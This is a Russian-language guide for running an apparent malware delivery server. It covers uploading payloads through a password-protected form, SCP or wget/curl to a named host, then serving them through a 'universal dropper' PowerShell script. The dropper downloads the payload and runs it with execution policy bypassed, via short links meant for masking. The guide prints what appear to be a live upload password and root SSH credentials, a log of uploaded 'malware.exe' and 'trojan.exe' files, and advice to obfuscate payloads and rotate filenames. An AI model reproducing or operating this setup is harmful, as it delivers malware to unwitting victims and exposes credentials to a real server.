# 📦 Руководство по загрузке Payload

## 🔐 Профессиональная форма загрузки

**URL:** https://ipv6app.bar/upload_payload.php

**Пароль:** `UploadPayload2026!`

### ✨ Функции формы:

- 🔒 **Защищена паролем**
- 📤 **Drag & Drop** поддержка
- 📊 **Прогресс загрузки**
- ✅ **Проверка статуса** текущего payload
- 🗑️ **Удаление** старого payload
- 📝 **Логирование** всех операций
- 🔗 **Ссылки на droppers** прямо в форме
- 💯 **До 100 MB** размер файла

## 🚀 Способы загрузки Payload

### 1. Через веб-форму (Рекомендуется) ⭐

**Шаги:**
1. Откройте: https://ipv6app.bar/upload_payload.php
2. Введите пароль: `UploadPayload2026!`
3. Перетащите файл или нажмите "Выберите файл"
4. Нажмите "Загрузить на сервер"
5. Готово! ✅

**Преимущества:**
- Не нужен SSH
- Drag & Drop
- Визуальный прогресс
- Проверка статуса
- Безопасно

### 2. Через SCP

```bash
scp /путь/к/вашему/payload.exe root@212.11.64.122:/var/www/html/payload.exe
```

**После загрузки:**
```bash
ssh root@212.11.64.122
chmod 644 /var/www/html/payload.exe
chown www-data:www-data /var/www/html/payload.exe
```

### 3. Через WinSCP (Windows)

**Подключение:**
- Протокол: SCP
- Хост: 212.11.64.122
- Порт: 22
- Логин: root
- Пароль: uCuGp6Fadfd

**Путь:** `/var/www/html/payload.exe`

### 4. Через SSH + wget/curl

```bash
ssh root@212.11.64.122
cd /var/www/html
wget https://ваш-сервер.com/payload.exe
# или
curl -O https://ваш-сервер.com/payload.exe

# Установить права
chmod 644 payload.exe
chown www-data:www-data payload.exe
```

## 📋 Поддерживаемые форматы

Universal Dropper поддерживает:

| Формат | Описание | Как запускается |
|--------|----------|-----------------|
| `.exe` | Исполняемый файл | `Start-Process` |
| `.msi` | MSI установщик | `msiexec /i /quiet` |
| `.bat` | Batch скрипт | `cmd.exe /c` |
| `.ps1` | PowerShell скрипт | `powershell -ExecutionPolicy Bypass` |
| `.zip` | ZIP архив | Распаковка + запуск EXE |
| `.dll` | Библиотека | `Start-Process` |

**Примечание:** Хотя форма называет файл `payload.exe`, dropper работает с любым форматом!

## ✅ После загрузки

### 1. Проверить доступность

```bash
curl -I https://ipv6app.bar/payload.exe
```

Должен вернуть `200 OK`

### 2. Проверить размер

```bash
ssh root@212.11.64.122 "ls -lh /var/www/html/payload.exe"
```

### 3. Протестировать dropper

**Откройте в браузере:**
```
https://ipv6app.bar/m959xx3csx
```

Должно начаться скачивание `universal_dropper.ps1`

### 4. Проверить логи

В админ панели или через форму загрузки будет виден статус:
- ✅ Размер файла
- ✅ Время загрузки
- ✅ URL доступа

## 🔗 Ссылки для доставки

После загрузки payload используйте эти ссылки:

### Universal Dropper (Лучший выбор) 🌟

**Короткий URL:**
```
https://ipv6app.bar/m959xx3csx
```

**Delivery page:**
```
https://ipv6app.bar/universal_delivery.html
```

**Прямая загрузка:**
```
https://ipv6app.bar/download.php?f=universal_dropper.ps1
```

## 🎯 Как это работает

1. **Вы загружаете** `payload.exe` через форму
2. **Файл сохраняется** как `/var/www/html/payload.exe`
3. **Доступен по URL** `https://ipv6app.bar/payload.exe`
4. **Dropper скачивает** payload с этого URL
5. **Dropper определяет** тип файла по расширению
6. **Запускает** правильным способом

## 🔒 Безопасность

- ✅ Защита паролем
- ✅ Session-based аутентификация
- ✅ Логирование всех операций в `upload_log.txt`
- ✅ Проверка прав доступа к файлам
- ✅ Ограничение размера (100 MB)
- ✅ HTTPS соединение

## 📊 Логирование

Все операции логируются в файл `/var/www/html/upload_log.txt`:

```
2026-02-11 05:10:15 - Uploaded: malware.exe (2.5 MB)
2026-02-11 05:15:30 - Deleted: payload.exe
2026-02-11 05:20:45 - Uploaded: trojan.exe (5.8 MB)
```

**Просмотр логов:**
```bash
ssh root@212.11.64.122 "cat /var/www/html/upload_log.txt"
```

## ⚠️ Важные замечания

1. **Имя файла:** Всегда сохраняется как `payload.exe` независимо от оригинального имени
2. **Перезапись:** Новая загрузка перезаписывает старый файл
3. **Права:** Автоматически устанавливаются (644, www-data)
4. **URL:** Всегда одинаковый - `https://ipv6app.bar/payload.exe`
5. **Dropper:** Не нужно обновлять после смены payload

## 🐛 Решение проблем

### Файл не загружается

1. Проверьте размер (максимум 100 MB)
2. Проверьте формат файла
3. Попробуйте через SCP
4. Проверьте логи Apache

### Payload не скачивается

1. Проверьте URL: `curl -I https://ipv6app.bar/payload.exe`
2. Проверьте права: `ls -l /var/www/html/payload.exe`
3. Проверьте что файл существует
4. Проверьте размер файла

### Dropper не работает

1. Убедитесь что payload.exe загружен
2. Проверьте URL в dropper скрипте
3. Протестируйте короткий URL
4. Проверьте логи в админ панели

## 🔧 Изменение URL payload

Если хотите использовать другой URL (не `payload.exe`):

### Вариант 1: Другое имя файла

```bash
# Загрузить с другим именем
ssh root@212.11.64.122
cd /var/www/html
mv payload.exe custom_name.exe

# Обновить dropper
sed -i 's/payload.exe/custom_name.exe/' assets/droppers/windows/universal_dropper.ps1
```

### Вариант 2: Внешний сервер

Отредактируйте `universal_dropper.ps1`:

```powershell
# Изменить URL
$url = "https://другой-сервер.com/файл.exe";
```

## 📈 Рекомендации

### Для продакшна:

1. **Используйте обфускацию** payload если необходимо
2. **Меняйте имена файлов** регулярно
3. **Используйте короткие URL** для маскировки
4. **Мониторьте статистику** в админ панели
5. **Удаляйте старые payload** после использования

### Для тестирования:

1. **Используйте тестовые файлы** сначала
2. **Проверяйте все ссылки** перед отправкой
3. **Тестируйте dropper** локально
4. **Смотрите логи** для отладки

---

**Создано:** 11 февраля 2026  
**Форма загрузки:** https://ipv6app.bar/upload_payload.php  
**Пароль:** UploadPayload2026!
